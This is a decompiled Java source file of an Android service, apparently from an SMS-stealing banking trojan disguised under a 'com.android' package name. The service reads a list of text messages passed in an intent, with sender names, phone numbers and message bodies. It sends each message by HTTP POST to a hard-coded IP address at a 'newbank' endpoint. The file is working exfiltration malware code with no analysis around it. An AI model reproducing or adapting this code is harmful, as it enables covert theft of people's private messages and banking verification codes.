// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.android.smsnew;

import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import java.util.*;
import org.json.JSONObject;

// Referenced classes of package com.android.smsnew:
//            SmsBeanList, HttpClientUtils, SmsInfo

public class SendMsgService extends Service
{
    private class MyRunnable
        implements Runnable
    {

        public void run()
        {
            List list = listBean.getListSms();
            HttpClientUtils httpclientutils = new HttpClientUtils();
            Iterator iterator = list.iterator();
            do
            {
                if(!iterator.hasNext())
                    return;
                SmsInfo smsinfo = (SmsInfo)iterator.next();
                HashMap hashmap = new HashMap();
                hashmap.put("smsModel.smsM2", smsinfo.getName());
                hashmap.put("smsModel.smsM3", smsinfo.getPhoneNumber());
                hashmap.put("smsModel.smsM4", smsinfo.getSmsbody());
                try
                {
                    String s = httpclientutils.doPost("http://103.17.116.48:8080/newbank/newbank/bank!saveSms.do", hashmap).toString();
                    Log.i("wlc", (new StringBuilder("result:")).append(s).toString());
                    (new JSONObject(s)).optString("error");
                }
                catch(Exception exception)
                {
                    exception.printStackTrace();
                }
            } while(true);
        }

        final SendMsgService this$0;

        private MyRunnable()
        {
            this$0 = SendMsgService.this;
            super();
        }

        MyRunnable(MyRunnable myrunnable)
        {
            this();
        }
    }


    public SendMsgService()
    {
        bundle = null;
        listBean = null;
        isSend = false;
    }

    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public void onStart(Intent intent, int i)
    {
        super.onStart(intent, i);
    }

    public int onStartCommand(Intent intent, int i, int j)
    {
        if(intent != null)
        {
            bundle = intent.getExtras();
            if(bundle != null)
            {
                listBean = (SmsBeanList)bundle.getSerializable("msg");
                (new Thread(new MyRunnable(null))).start();
            }
        }
        return super.onStartCommand(intent, i, j);
    }

    private Bundle bundle;
    private boolean isSend;
    private SmsBeanList listBean;

}
